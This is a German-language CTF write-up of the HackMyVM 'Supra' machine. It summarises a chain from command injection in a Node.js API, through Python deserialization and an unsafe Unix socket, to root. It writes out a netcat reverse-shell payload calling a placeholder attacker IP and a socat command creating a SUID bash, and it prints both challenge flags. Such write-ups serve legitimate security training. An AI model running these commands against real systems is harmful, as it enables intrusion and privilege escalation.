# Supra - HackMyVM (Hard)
 
![Supra.png](Supra.png)

## Übersicht

*   **VM:** Supra
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Supra)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 21. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Supra_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Supra"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Identifizierung einer Node.js-Anwendung auf Port 4000. Eine Path-Traversal-Schwachstelle (`/uploads/..%2Fapp.js`) wurde gefunden, aber der entscheidende Einstiegspunkt war ein API-Endpunkt (`/internal-processes-v1-display`) mit einer Command Injection im `uid`-Parameter. Dies ermöglichte eine Reverse Shell als `www-data`. Die Privilegieneskalation erfolgte in mehreren Schritten: Zuerst wurden über einen internen API-Endpunkt (`/read-leaked-accounts` auf Port 8082, nur lokal erreichbar) Klartext-Credentials für mehrere Konten geleakt. Ein Python-Deserialisierungsangriff gegen einen weiteren internen API-Endpunkt (Port 8081, nur lokal erreichbar), vermutlich mit einem der geleakten Accounts oder durch weitere Enumeration des API-Codes, führte zu einer Shell als Benutzer `it404`. Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Der finale Schritt zur Root-Eskalation erfolgte durch die Ausnutzung eines unsicheren Unix Domain Sockets (`/usr/local/src/socket.s`). Über diesen Socket konnten Befehle gesendet werden, um eine SUID-Bash-Kopie in `/tmp` zu erstellen, was zu Root-Rechten führte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wfuzz`
*   `curl`
*   `nc` (netcat)
*   `python3`
*   `stty`
*   `ls`
*   `cat`
*   `sudo` (versucht)
*   `netstat` (oder `ss`)
*   `git`
*   `chmod`
*   `wget`
*   `ssh`
*   `socat`
*   `bash`
*   `cp` (via socat)
*   Standard Linux-Befehle

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Supra" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.109`).
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH), 80 (HTTP - Apache Default), 4000 (HTTP - Node.js "NullTrace").
    *   `gobuster` auf Port 80 zeigte Standardinhalte.
    *   Entdeckung einer Path-Traversal-Schwachstelle auf Port 4000 (`/uploads/..%2Fapp.js`).
    *   Identifizierung eines verwundbaren API-Endpunkts auf Port 4000: `/internal-processes-v1-display`.
    *   Bestätigung einer Command Injection im Parameter `uid` dieses Endpunkts (`?uid=id;[BEFEHL]`).

2.  **Initial Access (Reverse Shell via Command Injection):**
    *   Ausnutzung der Command Injection im `uid`-Parameter von `/internal-processes-v1-display` (Port 4000) mit einem URL-kodierten Reverse-Shell-Payload (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Angreifer-IP] 9001 >/tmp/f`).
    *   Erlangung einer interaktiven Shell als Benutzer `www-data`.

3.  **Privilege Escalation (von `www-data` zu `it404`):**
    *   `www-data` hatte keinen direkten `sudo`-Zugriff.
    *   Entdeckung eines lauschenden Unix Domain Sockets `/usr/local/src/socket.s`.
    *   Entdeckung eines internen API-Endpunkts auf Port 8082 (nur lokal erreichbar via `curl 127.0.0.1:8082/read-leaked-accounts`), der Klartext-E-Mail/Passwort-Kombinationen preisgab.
    *   Entdeckung eines weiteren internen API-Endpunkts auf Port 8081 (nur lokal erreichbar).
    *   Vorbereitung eines Python-Deserialisierungs-Payloads (Reverse Shell zu Port 666) mit einem externen Tool (`python-deserialization-attack-payload-generator`).
    *   Senden des Deserialisierungs-Payloads an einen (nicht explizit im Log gezeigten) verwundbaren Endpunkt der internen API auf `127.0.0.1:8081`.
    *   Erlangung einer Reverse Shell als Benutzer `it404`.
    *   User-Flag `51cd198c3850df9cbca35f2d7609a5cc` in `/home/it404/local.txt` gelesen.

4.  **Privilege Escalation (von `it404` zu `root`):**
    *   Ausnutzung des zuvor identifizierten Unix Domain Sockets `/usr/local/src/socket.s`.
    *   Senden von Befehlen an den Socket mittels `socat` als `it404`: `echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - unix-client:/usr/local/src/socket.s`.
    *   Diese Befehle erstellten eine SUID-Kopie von Bash in `/tmp/bash`.
    *   Ausführen von `/tmp/bash -p` als `it404` führte zu einer Root-Shell.
    *   Root-Flag `3d7121ef7752d55a72c938af2248d777` in `/root/proof.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Command Injection in API:** Ein Node.js API-Endpunkt (`/internal-processes-v1-display?uid=...`) war anfällig für Command Injection.
*   **Path Traversal:** Eine Path-Traversal-Schwachstelle in der Node.js-Anwendung wurde initial gefunden (aber nicht primär für den Zugriff genutzt).
*   **Informationsleck durch internen API-Endpunkt:** Klartext-Credentials wurden über einen internen API-Endpunkt (`/read-leaked-accounts`) preisgegeben.
*   **Python Deserialization:** Eine interne API (Port 8081) war anfällig für unsichere Deserialisierung von Python-Objekten, was zur Codeausführung führte.
*   **Unsicherer Unix Domain Socket:** Ein Unix-Socket (`/usr/local/src/socket.s`) nahm unsanitisierte Befehle entgegen und führte sie vermutlich mit erhöhten Rechten aus, was die Erstellung einer SUID-Bash ermöglichte.
*   **SUID Binary Exploit (indirekt):** Erstellung einer SUID-Kopie von Bash durch Ausnutzung des unsicheren Sockets.

## Flags

*   **User Flag (`/home/it404/local.txt`):** `51cd198c3850df9cbca35f2d7609a5cc`
*   **Root Flag (`/root/proof.txt`):** `3d7121ef7752d55a72c938af2248d777`

## Tags

`HackMyVM`, `Supra`, `Hard`, `Command Injection`, `Node.js`, `Python Deserialization`, `Unix Socket Exploitation`, `SUID Exploit`, `API Exploitation`, `Path Traversal`, `Linux`, `Web`, `Privilege Escalation`
